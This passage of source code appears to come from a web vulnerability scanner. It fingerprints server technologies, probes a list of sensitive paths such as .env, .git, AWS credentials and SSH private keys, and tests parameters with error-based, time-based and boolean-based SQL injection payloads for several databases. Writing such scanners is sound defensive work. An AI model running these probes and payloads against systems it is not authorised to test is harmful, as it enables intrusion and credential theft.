      remediation: "Keep WordPress and all plugins/themes updated. Consider hiding the version (remove meta generator tag). Use a WAF. Disable xmlrpc.php if not needed.",
    });
  }

  // Drupal
  if (body.includes("Drupal") || h["x-generator"]?.includes("Drupal")) {
    techs.push({ name: "Drupal", category: "CMS" });
  }

  // Joomla
  if (body.includes("/components/com_") || body.includes("Joomla")) {
    techs.push({ name: "Joomla", category: "CMS" });
  }

  // React
  if (body.includes("__REACT_DEVTOOLS") || body.includes("react-dom") || body.includes("_react")) {
    techs.push({ name: "React", category: "Frontend Framework" });
  }

  // Next.js
  if (h["x-powered-by"]?.includes("Next.js") || body.includes("__NEXT_DATA__")) {
    techs.push({ name: "Next.js", category: "Frontend Framework" });
    if (body.includes('"props"') && body.includes('"pageProps"') && body.includes('"buildId"')) {
      const buildIdMatch = body.match(/"buildId":"([^"]+)"/);
      findings.push({
        title: "Next.js Build ID Exposed",
        severity: "low",
        description: `Next.js __NEXT_DATA__ script exposes the build ID${buildIdMatch ? ` (${buildIdMatch[1]})` : ""}. This reveals deployment versioning info useful for targeted attacks.`,
        cvss: 3.1, cve: null,
        evidence: `__NEXT_DATA__ script present in HTML${buildIdMatch ? `\nbuildId: ${buildIdMatch[1]}` : ""}`,
        remediation: "This is often acceptable for public pages. If sensitive, consider server-side rendering strategies that minimise __NEXT_DATA__ exposure.",
      });
    }
  }

  // Laravel
  if (body.includes("laravel_session") || h["set-cookie"]?.includes("laravel")) {
    techs.push({ name: "Laravel (PHP)", category: "Backend Framework" });
  }

  // Django
  if (h["x-frame-options"] === "SAMEORIGIN" && h["x-content-type-options"] === "nosniff" && !h["content-security-policy"]) {
    techs.push({ name: "Possibly Django (Python)", category: "Backend Framework" });
  }

  // Nginx
  if (server.includes("nginx")) {
    techs.push({ name: `Nginx ${server.match(/nginx\/([\d.]+)/i)?.[1] ?? ""}`.trim(), category: "Web Server" });
  }

  // Apache
  if (server.toLowerCase().includes("apache")) {
    techs.push({ name: `Apache ${server.match(/apache\/([\d.]+)/i)?.[1] ?? ""}`.trim(), category: "Web Server" });
  }

  // Cloudflare
  if (h["cf-ray"] || h["cf-cache-status"]) {
    techs.push({ name: "Cloudflare CDN", category: "CDN/WAF" });
    await onLog(`[${ts()}] Cloudflare WAF/CDN detected — some probes may be filtered`);
  }

  // AWS
  if (h["x-amz-request-id"] || h["x-amzn-trace-id"] || h["x-amz-cf-id"]) {
    techs.push({ name: "AWS (CloudFront/ALB)", category: "Cloud" });
  }

  // AWS Lambda
  if (h["x-amz-function-arn"] || h["x-amz-executed-version"]) {
    techs.push({ name: "AWS Lambda", category: "Serverless" });
    findings.push({
      title: "AWS Lambda Function Detected",
      severity: "low", cvss: 3.1, cve: null,
      description: "AWS Lambda ARN header exposed. Reveals serverless architecture details to attackers.",
      evidence: `x-amz-function-arn: ${h["x-amz-function-arn"] ?? "(detected)"}`,
      remediation: "Strip AWS Lambda metadata headers at the API Gateway or CloudFront layer.",
    });
  }

  // Kubernetes API / services
  if (body.includes('"kind":"Status"') || body.includes('"apiVersion"') && body.includes('"items"')) {
    techs.push({ name: "Kubernetes API", category: "Container Orchestration" });
    findings.push({
      title: "Kubernetes API Response Detected",
      severity: "high", cvss: 8.1, cve: null,
      description: "The server returned a Kubernetes API-style response. Exposed Kubernetes API endpoints can allow cluster enumeration and potential takeover if unauthenticated.",
      evidence: `Response contains Kubernetes JSON kind/apiVersion fields\nSnippet: ${body.slice(0, 300)}`,
      remediation: "Restrict Kubernetes API server to internal IPs. Enable RBAC and authentication. Never expose the Kubernetes API publicly.",
    });
  }

  // Docker API
  if (h["server"]?.toLowerCase().includes("docker") || (body.includes('"ApiVersion"') && body.includes('"Os"'))) {
    techs.push({ name: "Docker API", category: "Container" });
    findings.push({
      title: "Docker Daemon API Exposed",
      severity: "critical", cvss: 10.0, cve: null,
      description: "Docker daemon REST API is publicly accessible. Full root-equivalent control over the host: create privileged containers, mount the host filesystem, and execute arbitrary commands as root.",
      evidence: `Docker API indicators in response headers/body\nServer: ${h["server"] ?? "(via body)"}`,
      remediation: "Disable remote Docker API. If required, enable TLS client auth (--tlsverify). Block ports 2375/2376 at the firewall.",
    });
  }

  // Apache Struts (look for .action suffix patterns or Struts-specific error messages)
  if (body.includes("org.apache.struts") || body.includes("struts.apache.org") || /\.action(\?|$)/i.test(r.finalUrl)) {
    techs.push({ name: "Apache Struts", category: "Backend Framework" });
    findings.push({
      title: "Apache Struts Framework Detected",
      severity: "medium", cvss: 6.1, cve: null,
      description: "Apache Struts framework detected. Struts has historically had critical RCE vulnerabilities (e.g. CVE-2017-5638/S2-045). Ensure the installed version is current and all CVEs are patched.",
      evidence: `Apache Struts indicators: ${body.includes("org.apache.struts") ? "org.apache.struts in response" : ".action suffix detected"}`,
      remediation: "Update Apache Struts to the latest stable release. Review all historical CVEs for your installed version. Disable OGNL injection if not required.",
    });
  }

  if (techs.length > 0) {
    await onLog(`[${ts()}] Technologies: ${techs.map((t) => `${t.name} (${t.category})`).join(", ")}`);
  }

  return { techs, findings };
}

// ═══════════════════════════════════════════════════════════════════════════════
// 10. SENSITIVE PATH DISCOVERY
// ═══════════════════════════════════════════════════════════════════════════════

const SENSITIVE_PATHS: { path: string; deep?: boolean; finding: Omit<RealFinding, "evidence"> }[] = [
  { path: "/.env",         finding: { title: ".env File Exposed", severity: "critical", cvss: 9.8, cve: null, description: "The .env file is publicly accessible. It commonly contains database passwords, API keys, secret keys, and other credentials.", remediation: "Block access to .env files in your web server config. Never store .env in the web root. Add .env to .gitignore." } },
  { path: "/.env.local",   finding: { title: ".env.local File Exposed", severity: "critical", cvss: 9.8, cve: null, description: ".env.local is publicly accessible and may contain local override credentials.", remediation: "Block access to all .env* files. Move secrets to a secrets manager." } },
  { path: "/.env.production", finding: { title: ".env.production Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Production environment file is publicly accessible.", remediation: "Block .env* files at the web server level." } },
  { path: "/.git/config",  finding: { title: "Git Repository Exposed (.git/config)", severity: "critical", cvss: 9.8, cve: null, description: "The .git directory is publicly accessible. Attackers can reconstruct the full source code, extract credentials from git history, and analyse the codebase for vulnerabilities.", remediation: "Block access to /.git/ at the web server. Nginx: location ~ /\\.git { deny all; } Never deploy with .git in the web root." } },
  { path: "/.git/HEAD",    finding: { title: "Git Repository HEAD Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Git repository is accessible. Full source code reconstruction is possible.", remediation: "Block /.git/ access at the web server layer." } },
  { path: "/backup.sql",   finding: { title: "Database Backup File Exposed (backup.sql)", severity: "critical", cvss: 9.8, cve: null, description: "A SQL database backup is publicly downloadable. Contains the complete database schema and all data.", remediation: "Remove backup files from the web root. Store backups in non-web-accessible storage." } },
  { path: "/dump.sql",     finding: { title: "Database Dump Exposed (dump.sql)", severity: "critical", cvss: 9.8, cve: null, description: "SQL database dump is publicly accessible.", remediation: "Remove database dumps from web-accessible directories." } },
  { path: "/phpinfo.php",  finding: { title: "PHP Info Page Exposed", severity: "high", cvss: 7.5, cve: null, description: "phpinfo() output is publicly accessible, revealing PHP version, all configuration values, environment variables, and server paths.", remediation: "Delete phpinfo.php from production." } },
  { path: "/wp-login.php", finding: { title: "WordPress Admin Login Exposed", severity: "medium", cvss: 5.3, cve: null, description: "WordPress login page is publicly accessible and subject to credential brute-force attacks.", remediation: "Rename wp-login.php. Add IP-based access control. Enable 2FA. Use a WAF to block brute-force attempts." } },
  { path: "/wp-config.php", deep: true, finding: { title: "WordPress Config File Accessible", severity: "critical", cvss: 9.8, cve: null, description: "wp-config.php may be publicly accessible, exposing database credentials.", remediation: "Ensure wp-config.php is not web-accessible. Move it above the web root." } },
  { path: "/adminer.php",  finding: { title: "Adminer Database UI Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Adminer (database management interface) is publicly accessible. Direct database access without authentication.", remediation: "Remove Adminer from production. Use a separate, IP-restricted management interface." } },
  { path: "/phpmyadmin/",  finding: { title: "phpMyAdmin Exposed", severity: "high", cvss: 8.1, cve: null, description: "phpMyAdmin database management interface is publicly accessible and subject to authentication brute-force.", remediation: "Restrict phpMyAdmin to internal IPs only. Remove from production if possible. Enable 2FA." } },
  { path: "/.DS_Store",    finding: { title: ".DS_Store File Exposed (Directory Enumeration Risk)", severity: "medium", cvss: 5.3, cve: null, description: "macOS .DS_Store file is exposed, revealing directory structure and filenames of the web root.", remediation: "Block access to .DS_Store files. Add to .gitignore. Nginx: location ~ /\\.DS_Store { deny all; }" } },
  { path: "/robots.txt",   finding: { title: "robots.txt Reveals Internal Paths", severity: "low", cvss: 3.1, cve: null, description: "robots.txt is accessible. While not a vulnerability itself, Disallow entries often enumerate admin panels, API paths, and internal routes.", remediation: "Review robots.txt for sensitive path disclosure. Do not rely on robots.txt for access control — use actual authentication and IP restrictions." } },
  { path: "/server-status", deep: true, finding: { title: "Apache Server Status Page Exposed", severity: "high", cvss: 7.5, cve: null, description: "Apache mod_status is publicly accessible, revealing server load, active connections, request URIs (potentially with session tokens), and internal IP addresses.", remediation: "Restrict mod_status to localhost: Allow from 127.0.0.1" } },
  { path: "/server-info",  deep: true, finding: { title: "Apache Server Info Page Exposed", severity: "high", cvss: 7.5, cve: null, description: "Apache mod_info exposes detailed server configuration and loaded modules.", remediation: "Disable mod_info or restrict to localhost only." } },
  { path: "/.htpasswd",    finding: { title: ".htpasswd File Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Apache .htpasswd credential file is publicly readable, exposing hashed passwords for offline cracking.", remediation: "Block access to .htpasswd. Move it outside the web root." } },
  { path: "/config.php",   finding: { title: "config.php Exposed", severity: "high", cvss: 7.5, cve: null, description: "Configuration file is publicly accessible and may contain database credentials or API keys.", remediation: "Block access to config files. Move configuration outside the web root." } },
  { path: "/config.yaml",  deep: true, finding: { title: "config.yaml Exposed", severity: "high", cvss: 7.5, cve: null, description: "YAML configuration file accessible, potentially exposing credentials or infrastructure details.", remediation: "Block access to all configuration files." } },
  { path: "/config.json",  deep: true, finding: { title: "config.json Exposed", severity: "high", cvss: 7.5, cve: null, description: "JSON configuration file accessible.", remediation: "Move configuration files outside the web root." } },
  { path: "/.well-known/security.txt", finding: { title: "security.txt Present (Informational)", severity: "low", cvss: 0, cve: null, description: "security.txt found (RFC 9116). This is a best practice for responsible disclosure — note it for your bug bounty scope.", remediation: "Ensure security.txt is kept up-to-date with current contact information and PGP key.", verification: "informational", confidence: 99 } },
  { path: "/api/v1/",      finding: { title: "API v1 Endpoint Accessible", severity: "low", cvss: 3.1, cve: null, description: "API endpoint discovered. Verify it enforces authentication and is not exposing unauthenticated data.", remediation: "Ensure all API endpoints require appropriate authentication and authorisation." } },
  { path: "/graphql",      finding: { title: "GraphQL Endpoint Exposed", severity: "medium", cvss: 5.3, cve: null, description: "GraphQL endpoint is publicly accessible.", remediation: "Disable introspection in production. Require authentication. Implement query depth and rate limiting." } },
  { path: "/.svn/entries", deep: true, finding: { title: "SVN Repository Exposed", severity: "critical", cvss: 9.8, cve: null, description: ".svn directory is accessible, exposing source code via SVN repository dump.", remediation: "Block /.svn/ access at the web server." } },
  { path: "/crossdomain.xml", finding: { title: "crossdomain.xml Present", severity: "low", cvss: 3.1, cve: null, description: "Flash crossdomain.xml policy file found. Check for overly permissive allow-access-from entries.", remediation: "If Flash is not used, remove crossdomain.xml. If needed, restrict to specific trusted domains." } },
  { path: "/trace.axd",    deep: true, finding: { title: "ASP.NET Trace Enabled (trace.axd)", severity: "high", cvss: 7.5, cve: null, description: "ASP.NET application tracing is enabled, exposing detailed request/response data including session tokens and form values.", remediation: "Disable tracing in production: <trace enabled='false'/> in web.config." } },
  { path: "/elmah.axd",    deep: true, finding: { title: "ELMAH Error Log Exposed", severity: "high", cvss: 7.5, cve: null, description: "ELMAH (Error Logging Modules and Handlers) error log is publicly accessible, exposing stack traces, internal paths, and potentially credentials from error messages.", remediation: "Restrict ELMAH to authenticated users: <security allowRemoteAccess='false'/>" } },
  { path: "/.well-known/openid-configuration", finding: { title: "OpenID Configuration Exposed", severity: "low", cvss: 3.1, cve: null, description: "OpenID Connect discovery document is publicly accessible, revealing issuer URL, endpoints, and supported algorithms.", remediation: "This is expected for public OIDC providers. Ensure the configuration matches your intended public OIDC deployment." } },
  // Source maps
  { path: "/js/app.js.map",       deep: true, finding: { title: "JavaScript Source Map Exposed (app.js.map)", severity: "medium", cvss: 5.3, cve: null, description: "A JavaScript source map is publicly accessible, exposing original source code, file structure, variable names, and business logic. This dramatically aids attackers in finding vulnerabilities.", remediation: "Disable source map serving in production. Webpack: devtool: false. Vite: build.sourcemap: false." } },
  { path: "/static/js/main.chunk.js.map", deep: true, finding: { title: "React Bundle Source Map Exposed", severity: "medium", cvss: 5.3, cve: null, description: "Source map for the React bundle is publicly accessible, exposing full application source code.", remediation: "Set GENERATE_SOURCEMAP=false in Create React App builds. Never serve .map files in production." } },
  // AWS / Cloud
  { path: "/.aws/credentials",    finding: { title: "AWS Credentials File Exposed", severity: "critical", cvss: 10.0, cve: null, description: "AWS credentials file is publicly accessible. Contains access key IDs and secret access keys enabling full AWS account compromise.", remediation: "Remove immediately. Revoke the exposed keys via IAM console. Use IAM instance roles instead of static credentials." } },
  { path: "/aws.json",            deep: true, finding: { title: "AWS Configuration JSON Exposed", severity: "critical", cvss: 9.8, cve: null, description: "AWS configuration file with potential credentials is publicly accessible.", remediation: "Remove AWS config files from the web root. Use IAM roles for service authentication." } },
  // CI/CD and build artifacts
  { path: "/.github/workflows/deploy.yml", deep: true, finding: { title: "GitHub Actions Workflow Exposed", severity: "medium", cvss: 5.3, cve: null, description: "GitHub Actions workflow file is publicly accessible, revealing deployment infrastructure, secret names, and CI/CD pipeline details.", remediation: "Block access to .github/ directory in the web server configuration." } },
  { path: "/Dockerfile",          deep: true, finding: { title: "Dockerfile Exposed", severity: "medium", cvss: 5.3, cve: null, description: "Dockerfile is publicly accessible, revealing base images, environment setup, installed packages, and potential secret injection patterns.", remediation: "Block access to Dockerfile and docker-compose files in the web server configuration." } },
  { path: "/docker-compose.yml",  deep: true, finding: { title: "docker-compose.yml Exposed", severity: "high", cvss: 7.5, cve: null, description: "Docker Compose file is publicly accessible. Often contains hardcoded credentials, environment variables, and internal service topology.", remediation: "Block access to docker-compose.yml. Remove any hardcoded secrets and use environment variable injection." } },
  // npm / package management
  { path: "/.npmrc",              finding: { title: ".npmrc File Exposed (Possible Auth Token)", severity: "critical", cvss: 9.8, cve: null, description: ".npmrc may contain npm authentication tokens for private registries, enabling package hijacking and supply-chain attacks.", remediation: "Remove .npmrc from the web root. Revoke any exposed npm tokens immediately." } },
  { path: "/package.json",        deep: true, finding: { title: "package.json Exposed (Dependency Manifest)", severity: "low", cvss: 3.1, cve: null, description: "package.json is accessible, revealing all dependencies and versions — enabling targeted CVE research against known vulnerable packages.", remediation: "Block access to package.json in production." } },
  // Kubernetes / infrastructure
  { path: "/kubeconfig",          finding: { title: "Kubernetes Config Exposed", severity: "critical", cvss: 10.0, cve: null, description: "Kubernetes configuration file is publicly accessible, containing cluster API server URLs and credentials enabling full cluster control.", remediation: "Remove kubeconfig from the web root. Rotate all Kubernetes credentials immediately." } },
  { path: "/.kube/config",        finding: { title: "Kubernetes Config Exposed (.kube/config)", severity: "critical", cvss: 10.0, cve: null, description: "Kubernetes cluster configuration with embedded credentials is publicly accessible.", remediation: "Remove immediately and rotate all cluster credentials." } },
  // Database / backup files
  { path: "/database.sql",        finding: { title: "Database SQL Dump Exposed", severity: "critical", cvss: 9.8, cve: null, description: "SQL database dump is publicly downloadable, exposing the complete database schema and all data.", remediation: "Remove backup files from the web root. Store backups in non-web-accessible locations." } },
  { path: "/db.sqlite",           finding: { title: "SQLite Database File Exposed", severity: "critical", cvss: 9.8, cve: null, description: "SQLite database file is publicly downloadable, containing all application data in a single portable file.", remediation: "Move database files outside the web root. Use PostgreSQL or MySQL for production workloads." } },
  // Additional sensitive paths
  { path: "/web.config",          deep: true, finding: { title: "IIS web.config Exposed", severity: "high", cvss: 8.1, cve: null, description: "IIS web.config may expose database connection strings, API keys, and application secrets.", remediation: "Block access to web.config files. IIS blocks this by default — verify the configuration." } },
  { path: "/wp-json/wp/v2/users", finding: { title: "WordPress REST API User Enumeration", severity: "medium", cvss: 5.3, cve: null, description: "WordPress REST API exposes user data including usernames, IDs, and avatars without authentication, enabling targeted brute-force attacks.", remediation: "Disable the /wp-json/wp/v2/users endpoint: add_filter('rest_endpoints', function($endpoints) { unset($endpoints['/wp/v2/users']); return $endpoints; });" } },
  { path: "/.git/logs/HEAD",      finding: { title: "Git Commit Log Exposed", severity: "high", cvss: 7.5, cve: null, description: "Git commit history is publicly accessible, potentially exposing developer names, email addresses, commit messages, and branching history.", remediation: "Block all access to the .git/ directory at the web server level." } },
  { path: "/api/graphql",         deep: true, finding: { title: "GraphQL Endpoint Discovered (/api/graphql)", severity: "medium", cvss: 5.3, cve: null, description: "An alternate GraphQL endpoint is accessible. May have different authentication controls than the primary endpoint.", remediation: "Ensure consistent authentication and introspection controls across all GraphQL endpoints." } },
  { path: "/metrics",             deep: true, finding: { title: "Prometheus Metrics Endpoint Exposed", severity: "medium", cvss: 5.3, cve: null, description: "Prometheus metrics endpoint is publicly accessible, revealing internal application metrics, memory usage, request rates, and potentially internal service names.", remediation: "Restrict /metrics to internal network access only. Add authentication." } },
  { path: "/health",              finding: { title: "Health Check Endpoint Exposed (Informational)", severity: "low", cvss: 0, cve: null, description: "Application health check endpoint is publicly accessible. May reveal dependency status, version information, or internal service topology.", remediation: "Consider restricting health endpoints to internal networks or load balancers. Ensure they do not reveal sensitive configuration.", verification: "informational", confidence: 99 } },
  { path: "/.env.backup",         finding: { title: ".env.backup Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Backup environment file is publicly accessible and likely contains full application secrets.", remediation: "Remove all .env* files from the web root. Block access at the web server level." } },
  { path: "/credentials.json",    finding: { title: "credentials.json Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Credentials JSON file is accessible, potentially containing API keys, OAuth tokens, or service account credentials.", remediation: "Remove credentials files from the web root. Use a secrets manager." } },
  { path: "/id_rsa",              finding: { title: "SSH Private Key Exposed (id_rsa)", severity: "critical", cvss: 10.0, cve: null, description: "SSH RSA private key is publicly accessible. Any server accepting this key can be accessed without a password.", remediation: "Remove immediately. Rotate the key pair. Audit which servers accepted this key." } },
  { path: "/.ssh/id_rsa",         finding: { title: "SSH Private Key Exposed (.ssh/id_rsa)", severity: "critical", cvss: 10.0, cve: null, description: "SSH private key at .ssh/id_rsa is publicly accessible.", remediation: "Remove immediately and rotate all SSH key pairs." } },
];

async function checkSensitivePaths(target: Target, deep: boolean, onLog: LogFn): Promise<RealFinding[]> {
  const paths = SENSITIVE_PATHS.filter((p) => !p.deep || deep);
  await onLog(`[${ts()}] Probing ${paths.length} sensitive paths...`);

  const BATCH = 12;
  const findings: RealFinding[] = [];
  const notFoundUrl = `${target.url.replace(/\/$/, "")}/sentinelx-not-found-${Date.now()}`;
  const notFound = await probe(notFoundUrl, { timeoutMs: 8_000 });
  const compact = (value: string) => value.replace(/\s+/g, " ").trim().slice(0, 4_000);
  const contentMarkers: Record<string, RegExp> = {
    "/.env": /(?:^|\n)\s*[A-Z][A-Z0-9_]{2,}\s*=/,
    "/.env.local": /(?:^|\n)\s*[A-Z][A-Z0-9_]{2,}\s*=/,
    "/.env.production": /(?:^|\n)\s*[A-Z][A-Z0-9_]{2,}\s*=/,
    "/.git/config": /^\s*(?:\[core\]|repositoryformatversion|ref:)/im,
    "/.git/HEAD": /^\s*ref:\s+refs\//im,
    "/backup.sql": /(create\s+table|insert\s+into|--\s*(?:mysql|postgres|sql))/i,
    "/dump.sql": /(create\s+table|insert\s+into|--\s*(?:mysql|postgres|sql))/i,
    "/phpinfo.php": /(php version|phpinfo\(\)|configuration file)/i,
    "/wp-login.php": /(wp-login|user_login|wordpress)/i,
    "/wp-config.php": /(db_name|db_user|wp-config|define\s*\(\s*['"]DB_)/i,
    "/adminer.php": /adminer/i,
    "/phpmyadmin/": /phpmyadmin/i,
    "/robots.txt": /(?:^|\n)\s*(?:user-agent|disallow|sitemap)\s*:/i,
    "/.well-known/security.txt": /(?:^|\n)\s*(?:contact|expires|encryption|policy)\s*:/i,
  };

  for (let i = 0; i < paths.length; i += BATCH) {
    const batch = paths.slice(i, i + BATCH);
    const results = await Promise.allSettled(
      batch.map(async ({ path, finding }) => {
        const url = target.url.replace(/\/$/, "") + path;
        const result = await probe(url, { timeoutMs: 8_000 });
        if (!result || result.status !== 200) return null;
        const resultBody = compact(result.body);
        const baselineBody = notFound ? compact(notFound.body) : "";
        if (notFound && result.status === notFound.status && resultBody === baselineBody) return null;
        const marker = contentMarkers[path];
        if (marker && !marker.test(result.body)) return null;
        if (!marker && resultBody.toLowerCase().includes("404") && result.body.length < 2_000) return null;
        const snippet = result.body.slice(0, 300).replace(/\s+/g, " ").trim();
        return {
          ...finding,
          evidence: `GET ${url} → HTTP ${result.status} (${result.durationMs}ms)\nContent-Type: ${result.headers["content-type"] ?? "unknown"}\nBody preview: ${snippet || "(empty)"}`,
        } as RealFinding;
      }),
    );
    for (const r of results) {
      if (r.status === "fulfilled" && r.value) {
        findings.push(r.value);
        await onLog(`[${ts()}] FOUND: ${r.value.title}`);
      }
    }
  }

  await onLog(`[${ts()}] Path discovery: ${findings.length} exposure(s) found`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 11. WEB APPLICATION VULNERABILITY PROBES
// ═══════════════════════════════════════════════════════════════════════════════

const SQLI_PATTERNS = [
  // MySQL
  /you have an error in your sql syntax/i,
  /warning.*mysql.*query/i,
  /warning:\s*mysql_/i,
  /supplied argument is not a valid mysql/i,
  // PostgreSQL
  /pg_query\(\): query failed/i,
  /psycopg2\.errors/i,
  /unterminated quoted string at or near/i,
  /pgsql:.*error/i,
  /psql:.*error/i,
  // MSSQL
  /unclosed quotation mark after the character string/i,
  /odbc.*sql server.*error/i,
  /microsoft sql native client/i,
  /sqlstate\[\d+\]/i,
  /sqlsrv_query\(\).*failed/i,
  // Oracle
  /ora-\d{5}/i,
  /oracle.*sql.*error/i,
  /quoted string not properly terminated/i,
  // OLE DB / ODBC
  /microsoft.*ole db.*provider.*error/i,
  /80040e14/i,
  /db2 sql error/i,
  // SQLite
  /sqlite3\.operationalerror/i,
  /sqlite_error/i,
  // Generic
  /sqlexception.*syntax error/i,
  /invalid sql statement/i,
  /column .* does not exist/i,
  /table .* doesn't exist/i,
  /syntax error.*near/i,
  /sql command not properly ended/i,
  /division by zero/i,
];

async function checkWebApp(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];

  // ── SQLi error detection ──────────────────────────────────────────────────
  await onLog(`[${ts()}] Testing SQL injection (error-based and blind)...`);
  const sqliParams = ["id", "search", "q", "query", "page", "cat", "user", "item", "product", "order", "filter", "sort", "name"];
  const sqliPayloads = [
    "'", "1 OR 1=1--", "1' OR '1'='1", "1'--", "1 AND 1=2--", `' OR 'x'='x`,
    "1; SELECT SLEEP(0)--", "1 UNION SELECT NULL--", "1' AND 1=2 UNION SELECT NULL--",
  ];
  const sqliBaseline = await probe(target.url, { timeoutMs: 8_000 });
  let sqliFound = false;
  for (const param of sqliParams.slice(0, 8)) {
    if (sqliFound) break;
    for (const payload of sqliPayloads.slice(0, 6)) {
      if (sqliFound) break;
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const matched = SQLI_PATTERNS.find((p) => p.test(r.body));
      const baselineHasSameError = sqliBaseline ? SQLI_PATTERNS.some((p) => p.test(sqliBaseline.body)) : false;
      const responseChanged = !sqliBaseline || r.status !== sqliBaseline.status || Math.abs(r.body.length - sqliBaseline.body.length) > 50;
      if (matched && responseChanged && !baselineHasSameError) {
        findings.push({
          title: "SQL Injection — Database Error Leaked in Response",
          severity: "high",
          verification: "suspected",
          confidence: 72,
          description: `A SQL-shaped payload in parameter '${param}' produced a database error absent from the baseline. This is a strong signal of SQL injection error-disclosure; the probe does not establish data extraction or exploitability without further manual testing.`,
          cvss: 7.5, cve: null,
          evidence: `BASELINE: GET ${target.url} → HTTP ${sqliBaseline?.status ?? "unavailable"} (${sqliBaseline?.body.length} bytes)\nPROBE: ${probeUrl}\n→ HTTP ${r.status} (${r.body.length} bytes)\nPattern matched: ${matched}\nBody excerpt: ${r.body.slice(0, 400)}`,
          remediation: "Use parameterised queries/prepared statements exclusively. Never concatenate user input into SQL. Suppress all database errors in production. Apply least-privilege to DB accounts.",
        });
        sqliFound = true;
        break;
      }
    }
  }

  // ── Time-based blind SQLi ─────────────────────────────────────────────────
  if (!sqliFound) {
    await onLog(`[${ts()}] Testing time-based blind SQL injection (5s sleep, baseline-adjusted)...`);
    const sleepSec = 5;
    const confirmSec = 3;
    const blindPayloads = [
      { payload: `1' AND SLEEP(${sleepSec})--`,          db: "MySQL",      confirmPayload: `1' AND SLEEP(${confirmSec})--` },
      { payload: `1; WAITFOR DELAY '0:0:${sleepSec}'--`, db: "MSSQL",      confirmPayload: `1; WAITFOR DELAY '0:0:${confirmSec}'--` },
      { payload: `1' AND pg_sleep(${sleepSec})--`,        db: "PostgreSQL", confirmPayload: `1' AND pg_sleep(${confirmSec})--` },
      { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),${sleepSec})--`, db: "Oracle", confirmPayload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(97)||CHR(97),${confirmSec})--` },
      { payload: `1 AND RANDOMBLOB(500000000)--`,          db: "SQLite",     confirmPayload: `1 AND RANDOMBLOB(250000000)--` },
    ];
    for (const param of sqliParams.slice(0, 4)) {
      if (sqliFound) break;
      const baselineStart = Date.now();
      const bl = await probe(`${target.url.replace(/\/$/, "")}?${param}=1`, { timeoutMs: 8_000 });
      const baselineMs = Date.now() - baselineStart;
      if (!bl) continue;
      for (const { payload, db, confirmPayload } of blindPayloads) {
        const t0 = Date.now();
        const r = await probe(`${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`, { timeoutMs: (sleepSec + 6) * 1000 });
        const elapsed = Date.now() - t0;
        if (r && elapsed > baselineMs + 4000 && elapsed >= sleepSec * 1000 - 500) {
          // Confirm with a second distinct payload to rule out network jitter
          const t1 = Date.now();
          const confirmR = await probe(`${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(confirmPayload)}`, { timeoutMs: (confirmSec + 6) * 1000 });
          const confirmMs = Date.now() - t1;
          const confirmed = confirmR !== null && confirmMs > baselineMs + 2500 && confirmMs >= confirmSec * 1000 - 500;
          findings.push({
            title: `Time-Based Blind SQL Injection — ${db} SLEEP/DELAY ${confirmed ? "Confirmed" : "Signal"}`,
            severity: "high",
            verification: confirmed ? "verified" : "suspected",
            confidence: confirmed ? 88 : 65,
            description: `Parameter '${param}' caused a ${elapsed}ms response delay (baseline: ${baselineMs}ms) with a ${db} time-delay payload.${confirmed ? ` A confirmation probe (${confirmSec}s) also delayed ${confirmMs}ms, ruling out network jitter.` : " Consider confirming manually."}`,
            cvss: 8.1, cve: null,
            evidence: `Baseline: GET ?${param}=1 → ${baselineMs}ms\nPrimary probe (${sleepSec}s sleep): ${elapsed}ms\n${confirmed ? `Confirmation probe (${confirmSec}s sleep): ${confirmMs}ms\nDELAY REPEATABLE — confirmed` : "Confirmation probe not run or inconclusive"}\nDB targeted: ${db}`,
            remediation: "Use parameterised queries/prepared statements. Even without visible error output, the database evaluated the payload. Apply an ORM or query builder with automatic parameterisation.",
          });
          sqliFound = true;
          await onLog(`[${ts()}] ⚠ TIME-BASED BLIND SQLI ${confirmed ? "CONFIRMED" : "SIGNAL"}: ${db} — primary ${elapsed}ms, baseline ${baselineMs}ms via '${param}'`);
          break;
        }
      }
    }
  }

  // ── Boolean-based blind SQLi ──────────────────────────────────────────────
  if (!sqliFound) {
    await onLog(`[${ts()}] Testing boolean-based blind SQL injection...`);
    for (const param of sqliParams.slice(0, 5)) {
      if (sqliFound) break;
      const baseR = await probe(`${target.url.replace(/\/$/, "")}?${param}=1`, { timeoutMs: 8_000 });
      const trueR = await probe(`${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent("1 AND 1=1--")}`, { timeoutMs: 8_000 });
      const falseR = await probe(`${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent("1 AND 1=2--")}`, { timeoutMs: 8_000 });
      if (!baseR || !trueR || !falseR) continue;
      const lenTrue = trueR.body.length;
      const lenFalse = falseR.body.length;
      const lenBase = baseR.body.length;
      const trueSimilarToBase = Math.abs(lenTrue - lenBase) < 50;
      const diff = Math.abs(lenTrue - lenFalse);
      const pctDiff = lenTrue > 0 ? diff / lenTrue : 0;
      const statusDiff = trueR.status !== falseR.status;
      if ((pctDiff > 0.20 || statusDiff) && trueSimilarToBase) {
        findings.push({
          title: "Blind SQL Injection (Boolean-Based) — Response Differs",
          severity: "high",
          verification: "suspected",
          confidence: 72,
          description: `Parameter '${param}' returns significantly different responses for true (AND 1=1) vs false (AND 1=2) conditions (${Math.round(pctDiff * 100)}% length change${statusDiff ? `, HTTP status: ${trueR.status} vs ${falseR.status}` : ""}). This strongly suggests blind SQL injection — data can be extracted bit by bit without visible errors.`,
          cvss: 7.5, cve: null,
          evidence: `Baseline: ${lenBase} bytes\nTrue condition (AND 1=1): HTTP ${trueR.status} — ${lenTrue} bytes\nFalse condition (AND 1=2): HTTP ${falseR.status} — ${lenFalse} bytes\nDifference: ${diff} bytes (${Math.round(pctDiff * 100)}%)`,
